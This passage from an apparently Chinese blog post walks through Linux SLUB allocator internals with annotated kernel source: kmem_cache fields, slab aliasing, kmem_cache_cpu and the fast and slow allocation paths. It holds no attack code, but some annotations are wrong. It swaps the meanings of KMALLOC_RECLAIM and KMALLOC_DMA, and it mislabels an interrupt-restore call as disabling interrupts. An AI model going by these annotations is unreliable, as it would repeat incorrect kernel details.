slab 上最少的对象数量</p><h5 id="allocflags"><a href="#allocflags" class="headerlink" title="allocflags"></a><code>allocflags</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">gfp_t</span> allocflags;</span><br></pre></td></tr></table></figure><p>存放 GFP 标志位</p><h5 id="ctor"><a href="#ctor" class="headerlink" title="ctor"></a><code>ctor</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br></pre></td></tr></table></figure><p>对象的构造函数，分配对象会调用该函数进行初始化</p><h5 id="inuse"><a href="#inuse" class="headerlink" title="inuse"></a><code>inuse</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> inuse;</span><br></pre></td></tr></table></figure><p>实际上就是 <code>object_size</code></p><h5 id="align"><a href="#align" class="headerlink" title="align"></a><code>align</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> align;</span><br></pre></td></tr></table></figure><p>对象对齐的宽度</p><h5 id="random-seq"><a href="#random-seq" class="headerlink" title="random_seq"></a><code>random_seq</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br></pre></td></tr></table></figure><p>用于在 slab 初始化或时，随机化 <code>freelist</code> 上空闲对象的连接顺序</p><h5 id="useroffset-amp-usersize"><a href="#useroffset-amp-usersize" class="headerlink" title="useroffset &amp; usersize"></a><code>useroffset</code> &amp; <code>usersize</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> useroffset;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> usersize;</span><br></pre></td></tr></table></figure><p>Hardened Usercopy 保护相关</p><ul><li><code>useroffset</code>：用户空间能读写的区域起始偏移</li><li><code>usersize</code>：用户空间能读写的区域大小</li></ul><h5 id="node"><a href="#node" class="headerlink" title="node"></a><code>node</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br></pre></td></tr></table></figure><p><code>kmem_cache_node</code> 数组，对应不同 node 的后备内存池，一般计算机只有一个</p><h5 id="kmem-cache-类型"><a href="#kmem-cache-类型" class="headerlink" title="kmem_cache 类型"></a><code>kmem_cache</code> 类型</h5><p><code>kmem_cache</code> 有四种类型，在进行内存分配时若未指定内存池，则会根据 <code>allocflags</code> 从不同的 <code>kmem_cache</code> 中取</p><figure class="highlight c"><figcaption><span>include/linux/slab.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">kmalloc_cache_type</span> &#123;</span></span><br><span class="line">KMALLOC_NORMAL = <span class="number">0</span>,</span><br><span class="line">KMALLOC_RECLAIM,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">KMALLOC_DMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">NR_KMALLOC_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>KMALLOC_NORMAL</code>：通用内存池，对应 <code>kmalloc-*</code>，分配 flag 为 <code>GFP_KERNEL</code></li><li><code>KMALLOC_RECLAIM</code>：用于 DMA 的内存池，对应 <code>kmalloc-dma-*</code></li><li><code>KMALLOC_DMA</code>：可以被回收的内存池，对应 <code>kmalloc-rcl-*</code></li></ul><p>若没开启 DMA 选项，则合并入 <code>KMALLOC_NORMAL</code> 内存池</p><h5 id="slab-alias"><a href="#slab-alias" class="headerlink" title="slab alias"></a>slab alias</h5><p>一种对同等/近似大小对象的 <code>kmem_cache</code> 进行复用的机制</p><p>当要创建一个 <code>kmem_cache</code> 时，若已存在能分配相等/近似大小的对象的 <code>kmem_cache</code>，则不会创建新的 <code>kmem_cache</code>，而是为原有的 <code>kmem_cache</code> 起一个别名，作为“新的” <code>kmem_cache</code> 返回</p><p>例如 Linux 4.4 以前，<code>cred</code> 结构体与其他大小为 192 字节的结构体，会从同一个 <code>kmem_cache</code> —— <code>kmalloc-192</code> 中分配，就很容易被 UAF 漏洞利用提权</p><p>Linux 4.4 后，开启 <code>SLAB_ACCOUNT</code> 后，<code>cred</code> 结构体属于高权限结构体，会创建一个单独的 <code>kmem_cache</code> —— <code>cred_jar</code> 单独给 <code>cred</code> 结构体使用，而其他普通同大小的结构体使用 <code>kmalloc-192</code>，彼此之间互不干扰</p><h4 id="kmem-cache-cpu"><a href="#kmem-cache-cpu" class="headerlink" title="kmem_cache_cpu"></a><code>kmem_cache_cpu</code></h4><p>各 CPU 的独占内存池，在 <code>kmem_cache</code> 中为 percpu 字段</p><p>请求内存分配时，首先会尝试从当前 CPU 的 <code>kmem_cache_cpu</code> 取出对象</p><figure class="highlight c"><figcaption><span>include/linux/slub_def.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> **freelist;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> tid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">    <span class="type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>freelist</code>：指向下一个空闲对象的指针</li><li><code>tid</code>：表示当前处理该 <code>kmem_cache_cpu</code> 的线程 id，用来确保同一时刻只有一个线程在进行操作</li><li><code>page</code>：指向用来内存分配的页面的 slab 结构体，笔者这里简称为 cpu slab</li><li><code>partial</code>：归属于该 CPU 的仍有一定空闲对象的 slab 链表，这类 slab 简称为 cpu partial slab，需要开启 <code>CONFIG_SLUB_CPU_PARTIAL</code> 配置</li></ul><p>slab 上的 <code>freelist</code> 仅当其在 <code>kmem_cache_cpu</code> 的 <code>partial</code> 链表上有用，当 slab 在 <code>page</code> 上时，slab 的 <code>freelist</code> 为 NULL，其作用会被 <code>kmem_cache_cpu</code> 的 <code>freelist</code> 代替</p><p>#todo <code>kmem_cache_cpu</code> 与 slab 的联系</p><h3 id="对象分配"><a href="#对象分配" class="headerlink" title="对象分配"></a>对象分配</h3><h4 id="slab-alloc-node"><a href="#slab-alloc-node" class="headerlink" title="slab_alloc_node"></a><code>slab_alloc_node</code></h4><p>上层接口最后都会调用到 <code>slab_alloc_node</code> 来完成内存分配</p><ul><li><code>struct kmem_cache *s</code>：当前 <code>kmem_cache</code></li><li><code>gfp_t gfpflags</code>：分配标志位</li><li><code>int node</code>：指定的 node id，一般为 <code>NUMA_NO_NODE</code>（-1），即不指定 node</li><li><code>unsigned long addr</code>：开启 <code>SLAB_DEBUG_FLAGS</code> 后使用，一般不会使用</li></ul><figure class="highlight c"><figcaption><span>mm/slub,c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *<span class="title function_">slab_alloc_node</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params"><span class="type">gfp_t</span> gfpflags, <span class="type">int</span> node, <span class="type">unsigned</span> <span class="type">long</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> *object;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obj_cgroup</span> *<span class="title">objcg</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查参数的合法性，主要检查 gfp 是否合法</span></span><br><span class="line">s = slab_pre_alloc_hook(s, &amp;objcg, <span class="number">1</span>, gfpflags);</span><br><span class="line"><span class="keyword">if</span> (!s)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line">    <span class="comment">// 获取该 CPU 的 kmem_cache_cpu，while 循环确保 kmem_cache_cpu 真的属于 CPU，可能会被抢占到其他 CPU</span></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">tid = this_cpu_read(s-&gt;cpu_slab-&gt;tid);</span><br><span class="line">c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">&#125; <span class="keyword">while</span> (IS_ENABLED(CONFIG_PREEMPTION) &amp;&amp;</span><br><span class="line"> unlikely(tid != READ_ONCE(c-&gt;tid)));</span><br><span class="line"></span><br><span class="line">barrier();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先从 kmem_cache_cpu 上获取空闲对象和 cpu slab</span></span><br><span class="line">object = c-&gt;freelist;</span><br><span class="line">page = c-&gt;page;</span><br><span class="line"><span class="keyword">if</span> (unlikely(!object || !page || !node_match(page, node))) &#123;</span><br><span class="line">        <span class="comment">// 如果 kmem_cache_cpu 上没有空闲对象或 cpu slab</span></span><br><span class="line">        <span class="comment">// 调用 __slab_alloc 进行慢速分配</span></span><br><span class="line">object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果有空闲对象，就直接取出下一个空闲对象放入 free_list 中</span></span><br><span class="line"><span class="type">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 一个原子操作，确保只有一个线程能修改</span></span><br><span class="line">        <span class="comment">// 检查 cpu_slab-&gt;freelist == object, cpu_slab-&gt;tid == tid </span></span><br><span class="line">        <span class="comment">// cpu_slab-&gt;freelist = next_object, cpu_slab-&gt;tid = next(tid)</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(</span><br><span class="line">s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,</span><br><span class="line">object, tid,</span><br><span class="line">next_object, next_tid(tid)))) &#123;</span><br><span class="line"></span><br><span class="line">note_cmpxchg_failure(<span class="string">&quot;slab_alloc&quot;</span>, s, tid);</span><br><span class="line"><span class="keyword">goto</span> redo;</span><br><span class="line">&#125;</span><br><span class="line">prefetch_freepointer(s, next_object);</span><br><span class="line">stat(s, ALLOC_FASTPATH);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可能把对象的 next_free_object 清零（根据 kmem_cache 的标志位决定）</span></span><br><span class="line">maybe_wipe_obj_freeptr(s, object);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据分配标志位要不要将对象 data 初始化为 0</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(slab_want_init_on_alloc(gfpflags, s)) &amp;&amp; object)</span><br><span class="line"><span class="built_in">memset</span>(kasan_reset_tag(object), <span class="number">0</span>, s-&gt;object_size);</span><br><span class="line"></span><br><span class="line">slab_post_alloc_hook(s, objcg, gfpflags, <span class="number">1</span>, &amp;object);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>检查参数合法性</li><li>检查 <code>kmem_cache_cpu-&gt;free_list</code> 和 cpu slab 是否存在</li><li>如果都存在，调用 <code>get_freepointer_safe</code> 取下一个空闲对象放入 <code>kmem_cache_cpu-&gt;free_list</code></li><li>否则，调用 <code>__slab_alloc</code> 进行慢分配获取对象</li><li>根据标志位对对象进行初始化（将 <code>next_free_object</code> 和 <code>data</code> 清零）</li><li>返回对象</li></ol><p>总的来说就是先尝试快分配，不行就调用 <code>__slab_alloc</code> 进行慢分配，然后根据标志位进行初始化操作，最后返回对象</p><h4 id="slab-alloc"><a href="#slab-alloc" class="headerlink" title="__slab_alloc"></a><code>__slab_alloc</code></h4><p>为 <code>___slab_alloc</code> 的封装</p><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *__slab_alloc(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> gfpflags, <span class="type">int</span> node,</span><br><span class="line">              <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="keyword">struct</span> kmem_cache_cpu *c)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭中断</span></span><br><span class="line">    local_irq_save(flags);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PREEMPTION</span></span><br><span class="line">    <span class="comment">// 如果开启了抢占，kmem_cache_cpu 可能会被更换，重新获取</span></span><br><span class="line">    c = this_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    p = ___slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">    <span class="comment">// 关闭中断</span></span><br><span class="line">    local_irq_restore(flags);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关闭中断，调用 <code>___slab_alloc</code> 进行实际分配，分配完开启中断</p><h4 id="slab-alloc-1"><a href="#slab-alloc-1" class="headerlink" title="___slab_alloc"></a><code>___slab_alloc</code></h4><p>慢速分配的核心代码</p><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *___slab_alloc(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> gfpflags, <span class="type">int</span> node,</span><br><span class="line">              <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="keyword">struct</span> kmem_cache_cpu *c)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *freelist;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">    stat(s, ALLOC_SLOWPATH);</span><br><span class="line"></span><br><span class="line">    page = c-&gt;page;</span><br><span class="line">    <span class="comment">// 检查是否有自己的 cpu slab</span></span><br><span class="line">    <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">        <span class="comment">// 如果 node 没有正常空间或 node 不存在，就跳过此 node</span></span><br><span class="line">        <span class="keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">                 !node_state(node, N_NORMAL_MEMORY)))</span><br><span class="line">            node = NUMA_NO_NODE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 去获取新的 slab</span></span><br><span class="line">        <span class="keyword">goto</span> new_slab;</span><br><span class="line">    &#125;</span><br><span class="line">redo:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查 cpu slab 是否属于该 node</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!node_match(page, node))) &#123;</span><br><span class="line">        <span class="comment">// 如果 node 没有正常空间，则跳过此 node</span></span><br><span class="line">        <span class="keyword">if</span> (!node_state(node, N_NORMAL_MEMORY)) &#123;</span><br><span class="line">            node = NUMA_NO_NODE;</span><br><span class="line">            <span class="keyword">goto</span> redo;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果不属于该 node 将该 slab 从 kmem_cache_cpu 去掉</span></span><br><span class="line">            stat(s, ALLOC_NODE_MISMATCH);</span><br><span class="line">            deactivate_slab(s, page, c-&gt;freelist, c);</span><br><span class="line">            <span class="comment">//去获取新的 slab</span></span><br><span class="line">            <span class="keyword">goto</span> new_slab;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!pfmemalloc_match(page, gfpflags))) &#123;</span><br><span class="line">        deactivate_slab(s, page, c-&gt;freelist, c);</span><br><span class="line">        <span class="keyword">goto</span> new_slab;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再次检查一遍 freelist，看是否发生 CPU 迁移或中断出现了新的对象可用</span></span><br><span class="line">    freelist = c-&gt;freelist;</span><br><span class="line">    <span class="keyword">if</span> (freelist)</span><br><span class="line">        <span class="comment">// 如果 cpu slab 有新的空闲对象可用，就直接去用</span></span><br><span class="line">        <span class="keyword">goto</span> load_freelist;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 freelist 没有，从 cpu slab 上尝试寻找空闲对象</span></span><br><span class="line">    freelist = get_freelist(s, page);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!freelist) &#123;</span><br><span class="line">        <span class="comment">// 如果仍然没有，就去获取新的 slab</span></span><br><span class="line">        c-&gt;page = <span class="literal">NULL</span>;</span><br><span class="line">        stat(s, DEACTIVATE_BYPASS);</span><br><span class="line">        <span class="keyword">goto</span> new_slab;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stat(s, ALLOC_REFILL);</span><br><span class="line"></span><br><span class="line">load_freelist:</span><br><span class="line">    <span class="comment">// 检查 cpu slab 是否是 frozen 状态</span></span><br><span class="line">    VM_BUG_ON(!c-&gt;page-&gt;frozen);</span><br><span class="line">    <span class="comment">// 取出下一个空闲对象，放入 kmem_cache_cpu-&gt;freelist 中</span></span><br><span class="line">    c-&gt;freelist = get_freepointer(s, freelist);</span><br><span class="line">    c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">    <span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line">new_slab:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试获取 cpu partial slab</span></span><br><span class="line">    <span class="keyword">if</span> (slub_percpu_partial(c)) &#123;</span><br><span class="line">        <span class="comment">// 如果有 cpu partial slab，作为新的 cpu slab，跳转到 redo 重新获取对象</span></span><br><span class="line">        page = c-&gt;page = slub_percpu_partial(c);</span><br><span class="line">        slub_set_percpu_partial(c, page);</span><br><span class="line">        stat(s, CPU_PARTIAL_ALLOC);</span><br><span class="line">        <span class="keyword">goto</span> redo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用此函数，从 kmem_cache_node 中取，或申请新的 slab</span></span><br><span class="line">    freelist = new_slab_objects(s, gfpflags, node, &amp;c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!freelist)) &#123;</span><br><span class="line">        slab_out_of_memory(s, gfpflags, node);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    page = c-&gt;page;</span><br><span class="line">    <span class="keyword">if</span> (likely(!kmem_cache_debug(s) &amp;&amp; pfmemalloc_match(page, gfpflags)))</span><br><span class="line">        <span class="comment">// 取完后最后一般会跳转到 load_freelist</span></span><br><span class="line">        <span class="keyword">goto</span> load_freelist;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (kmem_cache_debug(s) &amp;&amp;</span><br><span class="line">            !alloc_debug_processing(s, page, freelist, addr))</span><br><span class="line">        <span class="keyword">goto</span> new_slab;</span><br><span class="line"></span><br><span class="line">    deactivate_slab(s, page, get_freepointer(s, freelist), c);</span><br><span class="line">    <span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>对 <code>freelist</code>、cpu slab 和 cpu slab 的 <code>freelist</code> 进行检查，检查是否因为 CPU 迁移或中断出现新的空闲对象，确定是否真的没有空闲对象了，如果还有就跳转到 load_freelist 标签直接取 freelist 的空闲对象即可</li><li>如果真没有，就跳转到 <strong>new_slab</strong> 标签（核心代码）</li><li>尝试获取 cpu partial slab，如果有，作为新的 cpu slab，跳转到步骤 1 再做检查</li><li>如果没有，调用 <code>new_slab_objects</code>（核心函数） 从 <code>kmem_cache_node</code> 获取 slab</li></ol><h4 id="deactivate-slab"><a href="#deactivate-slab" class="headerlink" title="deactivate_slab"></a><code>deactivate_slab</code></h4><p>将 cpu slab 从 <code>kmem_cache_cpu</code> 去掉</p><figure class="highlight c"><figcaption><span>mm/slub.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deactivate_slab</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> page *page,</span></span><br><span class="line"><span class="params">                <span class="type">void</span> *freelist, <span class="keyword">struct</span> kmem_cache_cpu *c)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">slab_modes</span> &#123;</span> M_NONE, M_PARTIAL, M_FULL, M_FREE &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, page_to_nid(page));</span><br><span class="line">    <span class="type">int</span> lock = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">slab_modes</span> <span class="title">l</span> =</span> M_NONE, m = M_NONE;</span><br><span class="line">    <span class="type">void</span> *nextfree;</span><br><span class="line">    <span class="type">int</span> tail = DEACTIVATE_TO_HEAD;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">new</span>;</span></span><br><span class="line">    <span class="class"><span 